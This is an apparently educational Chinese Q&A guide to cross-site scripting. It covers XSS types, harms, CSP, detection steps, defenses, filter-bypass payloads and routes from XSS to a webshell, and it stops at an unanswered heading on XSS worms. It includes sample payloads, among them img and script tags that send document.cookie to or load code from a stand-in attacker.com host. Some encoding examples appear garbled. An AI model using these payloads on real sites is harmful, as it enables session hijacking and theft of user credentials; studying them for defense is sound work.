<h3 class="md-end-block md-heading"><span class="md-plain">1. XSS 漏洞的原理</span></h3>
<p class="md-end-block md-p"><span class="md-plain">核心原理：程序对输入输出未进行合适处理，使得攻击者构造的特殊字符在输出到前端时，被浏览器当作有效代码解析执行，进而产生各种危害。</span></p>
<ul class="ul-list" data-mark="-">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">流程：用户输入恶意脚本→网站未过滤 / 编码→脚本被嵌入网页→受害者访问页面→浏览器将脚本当作正常代码执行。</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">本质：浏览器无法区分 “用户输入的恶意脚本” 和 “网站自身的合法脚本”，从而执行攻击者注入的代码。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">2. 什么是 XSS 攻击</span></h3>
<p class="md-end-block md-p"><span class="md-plain">XSS（Cross-Site Scripting，跨站脚本攻击）是指攻击者向网页注入恶意脚本（通常是 JavaScript），当受害者访问该页面时，脚本在其浏览器中执行，实现窃取信息、篡改页面、劫持会话等目的。</span></p>
<ul class="ul-list" data-mark="-">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">核心：利用网页对输入输出的处理漏洞，让恶意脚本 “混进” 网页并被执行。</span></p>
</li>
</ul>

<h3 class="md-end-block md-heading"><span class="md-plain">5. XSS 攻击可能造成哪些危害</span></h3>
<ul class="ul-list" data-mark="-">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">网络钓鱼：盗取各类用户账号，通过伪造登录页面等方式诱骗用户输入账号密码。</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">窃取隐私：获取用户 Cookie 资料，进而得到隐私信息或利用身份操作网站，侵犯用户隐私安全。</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">会话劫持：控制用户浏览器会话，执行非法转账、发表日志、发邮件等操作，以用户身份进行恶意行为。</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">干扰用户：强制弹出广告页面、刷流量，影响用户正常使用网站，降低用户体验。</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">网页挂马：在网页植入恶意软件，感染用户设备，破坏用户设备安全，可能导致设备数据泄露或被控制。</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">恶意篡改：篡改页面信息、删除文章等，破坏网站正常内容展示，影响网站的可信度和可用性。</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">客户端攻击：发起 DDoS 攻击，利用大量受感染的用户设备对目标服务器进行攻击，导致服务器瘫痪。</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">协同作恶：结合 CSRF 等漏洞进一步危害系统，扩大攻击范围和影响程度，增加系统安全风险。</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">传播恶意程序：传播跨站脚本蠕虫，通过 XSS 漏洞在用户之间自动扩散，危害更多用户。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">6. XSS 中 a 标签的防护措施</span></h3>
<p class="md-end-block md-p"><span class="md-plain">a 标签的风险主要来自</span><span class="md-pair-s" spellcheck="false"><code>href</code></span><span class="md-plain">属性被注入</span><span class="md-pair-s" spellcheck="false"><code>javascript:</code></span><span class="md-plain">伪协议（如</span><span class="md-pair-s" spellcheck="false"><code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;</code></span><span class="md-plain">），防护措施包括：</span></p>
<ul class="ul-list" data-mark="-">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">过滤危险协议：禁止</span><span class="md-pair-s" spellcheck="false"><code>javascript:</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>vbscript:</code></span><span class="md-plain">等伪协议，仅允许</span><span class="md-pair-s" spellcheck="false"><code>http://</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>https://</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>mailto:</code></span><span class="md-plain">等安全协议；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">输出编码：对</span><span class="md-pair-s" spellcheck="false"><code>href</code></span><span class="md-plain">内容进行 HTML 实体编码（如将</span><span class="md-pair-s" spellcheck="false"><code>&lt;</code></span><span class="md-plain">转为</span><span class="md-pair-s" spellcheck="false"><code>&lt;</code></span><span class="md-plain">），避免脚本被解析；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">限制链接域名：校验</span><span class="md-pair-s" spellcheck="false"><code>href</code></span><span class="md-plain">指向的域名是否在可信白名单内（如仅允许自家域名或合作方域名）；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">添加安全属性：使用</span><span class="md-pair-s" spellcheck="false"><code>rel=&quot;noopener noreferrer&quot;</code></span><span class="md-plain">，防止新页面通过</span><span class="md-pair-s" spellcheck="false"><code>window.opener</code></span><span class="md-plain">篡改原页面；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">禁止动态拼接：避免直接将用户输入作为</span><span class="md-pair-s" spellcheck="false"><code>href</code></span><span class="md-plain">值（如</span><span class="md-pair-s" spellcheck="false"><code>&lt;a href=&quot;{$user_input}&quot;&gt;</code></span><span class="md-plain">），需先经过严格校验。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">7. XSS 持久化技术</span></h3>
<p class="md-end-block md-p"><span class="md-plain">指让恶意脚本长期存在于目标系统中，持续发挥作用的技术，主要用于存储型 XSS：</span></p>
<ul class="ul-list" data-mark="-">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">实现方式：将脚本存入服务器的数据库（如评论、用户资料）、缓存系统（如 Redis）、日志文件（如后台错误日志）等；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">特点：一旦注入成功，所有访问该资源的用户都会触发，无需重复诱导受害者点击（区别于反射型的一次性触发）。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">8. 什么是 XSS 盲打</span></h3>
<p class="md-end-block md-p"><span class="md-plain">XSS 盲打是指攻击者无法直接观察脚本是否执行的场景（如脚本被注入到后台页面、管理员日志），通过 “间接回调” 确认漏洞的方法：</span></p>
<ul class="ul-list" data-mark="-">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">场景：后台评论审核页、错误日志页面（用户输入的内容仅管理员可见）；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">原理：注入含回调的脚本（如</span><span class="md-pair-s" spellcheck="false"><code>&lt;img src=&quot;http://attacker.com/log?admin=1&quot;&gt;</code></span><span class="md-plain">），当管理员查看页面时，脚本会向攻击者服务器发送请求，攻击者通过日志确认 “已触发”，从而发现漏洞。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">9. 构造 XSS 蠕虫的必要条件</span></h3>
<p class="md-end-block md-p"><span class="md-plain">XSS 蠕虫是能自动传播的恶意脚本，需满足：</span></p>
<ul class="ul-list" data-mark="-">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">存在存储型 XSS 漏洞：脚本能被存入服务器（确保持久化）；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">自动触发机制：脚本加载后无需用户操作即可执行（如</span><span class="md-pair-s" spellcheck="false"><code>onload</code></span><span class="md-plain">事件）；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">传播能力：脚本能自动向其他用户发送含自身的内容（如自动评论、私信）；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">绕过防御：能绕过网站的过滤规则（如关键词过滤、长度限制）和浏览器安全机制（如 CSP）。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">10. 什么是内容安全策略（CSP）？如何配置？有哪些绕过方式？</span></h3>
<ul class="ul-list" data-mark="-">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">定义：CSP（Content Security Policy）是一种安全层，通过限制网页可加载的资源（脚本、图片等）来源，防止 XSS 等注入攻击。</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">配置方式：</span></p>
<ul class="ul-list" data-mark="-">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">通过 HTTP 头：</span><span class="md-pair-s" spellcheck="false"><code>Content-Security-Policy: script-src &#039;self&#039; https://trusted-cdn.com</code></span><span class="md-plain">（仅允许本地和可信 CDN 的脚本）；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">通过</span><span class="md-pair-s" spellcheck="false"><code>&lt;meta&gt;</code></span><span class="md-plain">标签：</span><span class="md-pair-s" spellcheck="false"><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#039;self&#039;&quot;&gt;</code></span><span class="md-plain">。</span></p>
</li>
</ul>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">核心指令：</span><span class="md-pair-s" spellcheck="false"><code>default-src</code></span><span class="md-plain">（默认资源来源）、</span><span class="md-pair-s" spellcheck="false"><code>script-src</code></span><span class="md-plain">（脚本来源）、</span><span class="md-pair-s" spellcheck="false"><code>img-src</code></span><span class="md-plain">（图片来源）等。</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">绕过方式：</span></p>
<ul class="ul-list" data-mark="-">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">利用 CSP 配置错误（如</span><span class="md-pair-s" spellcheck="false"><code>script-src </code></span><span class="md-plain">允许任意来源）；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">劫持可信域名的资源（如可信 CDN 被入侵，植入恶意脚本）；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">利用</span><span class="md-pair-s" spellcheck="false"><code>data:</code></span><span class="md-plain">协议（若</span><span class="md-pair-s" spellcheck="false"><code>script-src</code></span><span class="md-plain">允许</span><span class="md-pair-s" spellcheck="false"><code>data:</code></span><span class="md-plain">，可注入</span><span class="md-pair-s" spellcheck="false"><code>data:text/javascript,alert(1)</code></span><span class="md-plain">）；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">利用内联事件（如</span><span class="md-pair-s" spellcheck="false"><code>onclick</code></span><span class="md-plain">，若</span><span class="md-pair-s" spellcheck="false"><code>&#039;unsafe-inline&#039;</code></span><span class="md-plain">未禁用）。</span></p>
</li>
</ul>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">11. 如何检测 XSS 漏洞（含黑盒检测步骤）</span></h3>
<p class="md-end-block md-p"><span class="md-plain">黑盒检测（无需源码）步骤：</span></p>
<ol class="ol-list" start="">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">收集输入点：找出所有用户可控输入位置（URL 参数、表单字段、评论区、文件上传文件名等）；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">构造测试 payload：从简单到复杂，如：</span></p>
<ul class="ul-list" data-mark="-">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">基础脚本：</span><span class="md-pair-s" spellcheck="false"><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></span><span class="md-plain">；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">事件触发：</span><span class="md-pair-s" spellcheck="false"><code>&lt;img src=x onerror=alert(1)&gt;</code></span><span class="md-plain">；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">编码绕过：</span><span class="md-pair-s" spellcheck="false"><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></span><span class="md-plain">；</span></p>
</li>
</ul>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">提交并观察响应：</span></p>
<ul class="ul-list" data-mark="-">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">若页面弹出</span><span class="md-pair-s" spellcheck="false"><code>alert</code></span><span class="md-plain">，说明存在 XSS；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">若未弹出，检查页面源码 / 控制台，确认脚本是否被过滤或编码；</span></p>
</li>
</ul>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">区分类型：</span></p>
<ul class="ul-list" data-mark="-">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">存储型：多次访问页面，脚本持续存在；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">反射型：脚本仅在含 payload 的 URL 中出现；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">DOM 型：页面源码无脚本，但 DOM 树中存在（通过浏览器 “检查元素” 查看）。</span></p>
</li>
</ul>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">12. 存储型 XSS 的攻击流程</span></h3>
<ol class="ol-list" start="">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">攻击者在目标网站的用户输入点（如评论区、个人资料）提交含恶意脚本的内容（如</span><span class="md-pair-s" spellcheck="false"><code>&lt;script src=&quot;http://attacker.com/xss.js&quot;&gt;&lt;/script&gt;</code></span><span class="md-plain">）；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">网站未过滤脚本，将其存入数据库；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">其他用户访问包含该内容的页面（如查看评论列表）；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">网站从数据库读取内容并输出到页面，恶意脚本被加载执行；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">脚本在用户浏览器中执行恶意操作（如窃取 Cookie、自动转发评论）。</span></p>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">13. 反射型 XSS 的攻击流程</span></h3>
<ol class="ol-list" start="">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">攻击者构造含恶意脚本的 URL（如</span><span class="md-pair-s" spellcheck="false"><code>http://target.com/search?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></span><span class="md-plain">）；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">通过钓鱼（如邮件、聊天工具）诱导受害者点击该 URL；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">受害者点击后，浏览器向目标网站发送请求，携带含脚本的参数；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">目标网站未过滤参数，将脚本 “反射” 到响应页面中（如搜索结果页显示</span><span class="md-pair-s" spellcheck="false"><code>&lt;p&gt;搜索结果：&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;/p&gt;</code></span><span class="md-plain">）；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">受害者浏览器加载响应，执行脚本，攻击者获取 Cookie 等信息。</span></p>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">14. DOM 型 XSS 怎么测试</span></h3>
<p class="md-end-block md-p"><span class="md-plain">DOM 型 XSS 由客户端 JS 处理用户输入导致，测试步骤：</span></p>
<ol class="ol-list" start="">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">定位 DOM 操作点：查找页面中用 JS 处理用户输入的代码（如</span><span class="md-pair-s" spellcheck="false"><code>location.search</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>document.write</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>document.URL</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>innerHTML</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>outterHTML</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>eval()</code></span><span class="md-plain">等）；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">构造测试输入：向输入点（如 URL 参数</span><span class="md-pair-s" spellcheck="false"><code>http://target.com/?x=test</code></span><span class="md-plain">）注入 payload（如</span><span class="md-pair-s" spellcheck="false"><code>x=&lt;img src=x onerror=alert(1)&gt;</code></span><span class="md-plain">）；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">检查 DOM 执行：通过浏览器 “检查元素” 查看 DOM 树，确认 payload 是否被注入到页面中；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">验证执行：若脚本触发</span><span class="md-pair-s" spellcheck="false"><code>alert</code></span><span class="md-plain">等操作，说明存在 DOM 型 XSS。</span></p>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">15. XSS 漏洞的防御措施</span></h3>
<p class="md-end-block md-p"><span class="md-plain">核心原则：输入验证 + 输出编码 + 安全配置，具体措施：</span></p>
<ul class="ul-list" data-mark="-">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">输入验证：</span></p>
<ul class="ul-list" data-mark="-">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">对用户输入进行 “白名单过滤”（如仅允许字母、数字及必要符号），拒绝</span><span class="md-pair-s" spellcheck="false"><code>&lt;</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>&gt;</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>script</code></span><span class="md-plain">等危险字符；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">限制输入长度（如评论区限制 1000 字内），减少 payload 注入空间。</span></p>
</li>
</ul>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">输出编码：</span></p>
<ul class="ul-list" data-mark="-">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">根据输出位置选择编码方式：</span></p>
<ul class="ul-list" data-mark="-">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">HTML 标签内：用 HTML 实体编码（如</span><span class="md-pair-s" spellcheck="false"><code>&lt;</code></span><span class="md-plain">代替</span><span class="md-pair-s" spellcheck="false"><code>&lt;</code></span><span class="md-plain">）；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">JavaScript 代码内：用 JS 编码（如</span><span class="md-pair-s" spellcheck="false"><code>\x3c</code></span><span class="md-plain">代替</span><span class="md-pair-s" spellcheck="false"><code>&lt;</code></span><span class="md-plain">）；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">URL 参数内：用 URL 编码（如</span><span class="md-pair-s" spellcheck="false"><code>%3c</code></span><span class="md-plain">代替</span><span class="md-pair-s" spellcheck="false"><code>&lt;</code></span><span class="md-plain">）。</span></p>
</li>
</ul>
</li>
</ul>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">安全配置：</span></p>
<ul class="ul-list" data-mark="-">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">对敏感 Cookie 设置</span><span class="md-pair-s" spellcheck="false"><code>HttpOnly</code></span><span class="md-plain">属性（防止</span><span class="md-pair-s" spellcheck="false"><code>document.cookie</code></span><span class="md-plain">读取）；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">启用内容安全策略（CSP），限制脚本加载来源（如</span><span class="md-pair-s" spellcheck="false"><code>script-src &#039;self&#039;</code></span><span class="md-plain">仅允许本地脚本）；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">设置 Cookie 的</span><span class="md-pair-s" spellcheck="false"><code>SameSite</code></span><span class="md-plain">属性（如</span><span class="md-pair-s" spellcheck="false"><code>SameSite=Strict</code></span><span class="md-plain">），防止跨站请求携带 Cookie；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">禁用不必要的 HTML 标签 / 属性（如通过 HTML Purifier 等工具过滤</span><span class="md-pair-s" spellcheck="false"><code>&lt;script&gt;</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>onclick</code></span><span class="md-plain">等）。</span></p>
</li>
</ul>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">16. XSS 漏洞的绕过方法</span></h3>
<p class="md-end-block md-p"><span class="md-plain">绕过核心是突破过滤规则或编码机制，常见方式：</span></p>
<ol class="ol-list" start="">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">大小写、双写或多写混淆：如</span><span class="md-pair-s" spellcheck="false"><code>&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</code></span><span class="md-plain">；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">注释干扰：在关键标签或脚本中插入注释，干扰过滤程序对代码的识别，如</span><span class="md-pair-s" spellcheck="false"><code>&lt;scri&lt;!-- --&gt;pt&gt;alert(1)&lt;/script&gt;</code></span><span class="md-plain">。</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">空白字符绕过：</span></p>
</li>
</ol>
<ul class="ul-list" data-mark="-">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">空格绕过：在关键字或标签中插入空格，使过滤机制难以准确匹配，如</span><span class="md-pair-s" spellcheck="false"><code>&lt;s cript&gt;alert(1)&lt;/script&gt;</code></span><span class="md-plain"> 。</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">Tab 绕过：使用 Tab 字符分隔关键字，示例为</span><span class="md-pair-s" spellcheck="false"><code>&lt;s cript&gt;alert(1)&lt;/script&gt;</code></span><span class="md-plain"> 。</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">回车换行绕过：利用回车换行符分割关键字，如</span></p>


```
<img src="jav
ascript:
alert('XSS');">
```


</li>
</ul>
<ol class="ol-list" start="4">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">特殊字符编码：</span></p>
</li>
</ol>
<ul class="ul-list" data-mark="-">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">HTML 实体编码：</span><span class="md-pair-s" spellcheck="false"><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></span><span class="md-plain">；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">Unicode 编码：</span><span class="md-pair-s" spellcheck="false"><code>\u003cscript\u003ealert(1)\u003c/script\u003e</code></span><span class="md-plain">；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">URL 编码：</span><span class="md-pair-s" spellcheck="false"><code>%3cscript%3ealert(1)%3c/script%3e</code></span><span class="md-plain">（配合 URL 解码场景）；</span></p>
</li>
</ul>
<ol class="ol-list" start="5">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">标签 / 事件/伪协议变异：</span></p>
</li>
</ol>
<ul class="ul-list" data-mark="-">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">用非</span><span class="md-pair-s" spellcheck="false"><code>&lt;script&gt;</code></span><span class="md-plain">标签执行脚本，如</span><span class="md-pair-s" spellcheck="false"><code>&lt;img src=x onerror=alert(1)&gt;</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>&lt;body onload=alert(1)&gt;</code></span><span class="md-plain">；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">拆分标签（如</span><span class="md-pair-s" spellcheck="false"><code>&lt;scr</code></span><span class="md-plain">+</span><span class="md-pair-s" spellcheck="false"><code>ipt&gt;alert(1)&lt;/scr</code></span><span class="md-plain">+</span><span class="md-pair-s" spellcheck="false"><code>ipt&gt;</code></span><span class="md-plain">）绕过完整关键词过滤；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">事件属性绕过：借助 HTML 元素的事件属性（如</span><span class="md-pair-s" spellcheck="false"><code>onclick</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>onmouseover</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>onerror</code></span><span class="md-plain">等）注入恶意脚本，例如</span><span class="md-pair-s" spellcheck="false"><code>&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</code></span><span class="md-plain">。</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">CSS 属性绕过：通过 CSS 的某些属性（如</span><span class="md-pair-s" spellcheck="false"><code>background-image</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>expression</code></span><span class="md-plain">等）执行脚本，像</span><span class="md-pair-s" spellcheck="false"><code>body { background-image: url(javascript:alert(&#039;XSS&#039;)); }</code></span><span class="md-plain"> 。</span></p>
</li>
</ul>
<ol class="ol-list" start="6">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">利用 HTML5 新特性：如</span><span class="md-pair-s" spellcheck="false"><code>&lt;svg onload=alert(1)&gt;</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>&lt;video poster=javascript:alert(1)&gt;</code></span><span class="md-plain">；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">绕过 CSP：若 CSP 配置宽松（如</span><span class="md-pair-s" spellcheck="false"><code>script-src &#039;unsafe-inline&#039;</code></span><span class="md-plain">），可直接注入内联脚本；或利用可信域名的漏洞（如可信 CDN 被劫持）。</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">框架和 iframe 绕过：通过在</span><span class="md-pair-s" spellcheck="false"><code>&lt;iframe&gt;</code></span><span class="md-plain">中加载恶意页面或构造恶意的</span><span class="md-pair-s" spellcheck="false"><code>&lt;frame&gt;</code></span><span class="md-plain">标签来绕过防护。</span></p>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">17. XSS 攻击中，攻击者如何利用 Cookie 窃取用户信息（含盗取方式）</span></h3>
<p class="md-end-block md-p"><span class="md-plain">核心利用</span><span class="md-pair-s" spellcheck="false"><code>document.cookie</code></span><span class="md-plain">获取 Cookie，再发送给攻击者服务器：</span></p>
<ul class="ul-list" data-mark="-">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">盗取方式：</span></p>
<ol class="ol-list" start="">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">img 标签请求：注入</span><span class="md-pair-s" spellcheck="false"><code>&lt;img src=&quot;http://attacker.com/log?cookie=&#039;+document.cookie+&#039;&quot;&gt;</code></span><span class="md-plain">，当图片加载时，Cookie 会被发送到攻击者的</span><span class="md-pair-s" spellcheck="false"><code>log</code></span><span class="md-plain">接口；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">XMLHttpRequest/Fetch：用脚本发送 POST 请求，将 Cookie 上传到攻击者服务器；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">WebSocket：建立 WebSocket 连接，实时发送 Cookie。</span></p>
</li>
</ol>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">防御限制：若 Cookie 设置了</span><span class="md-pair-s" spellcheck="false"><code>HttpOnly</code></span><span class="md-plain">属性，则</span><span class="md-pair-s" spellcheck="false"><code>document.cookie</code></span><span class="md-plain">无法读取，可有效阻止此类攻击。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">18. 如何快速判定 XSS 类型</span></h3>
<ul class="ul-list" data-mark="-">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">存储型：关闭页面后重新打开（无需携带原 URL 参数），脚本仍能执行（因存在数据库）；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">反射型：仅在携带 payload 的 URL 中触发，刷新页面若 URL 无 payload 则不执行；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">DOM 型：查看页面源码（</span><span class="md-pair-s" spellcheck="false"><code>Ctrl+U</code></span><span class="md-plain">），无注入的脚本；但通过 “检查元素” 查看 DOM 树，能找到脚本（说明脚本是客户端 JS 动态注入的）。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">19. XSS 怎么 getshell</span></h3>
<p class="md-end-block md-p"><span class="md-plain">XSS 本身难以直接 getshell（获取服务器控制权），需结合其他条件：</span></p>
<ul class="ul-list" data-mark="-">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">诱导用户下载恶意程序：通过 XSS 弹出伪造的 “系统更新” 窗口，诱导用户下载木马；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">利用浏览器漏洞：若受害者浏览器存在 0day 漏洞（如远程代码执行），XSS 脚本可触发漏洞执行本地代码；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">控制管理员后台：通过 XSS 窃取管理员 Cookie，登录后台后利用文件上传漏洞上传 webshell；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">条件限制：需目标系统存在多重漏洞（XSS + 文件上传 / 浏览器 0day），实战中成功率较低。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">20. 能简单介绍一下 XSS 蠕虫吗?</span></h3>
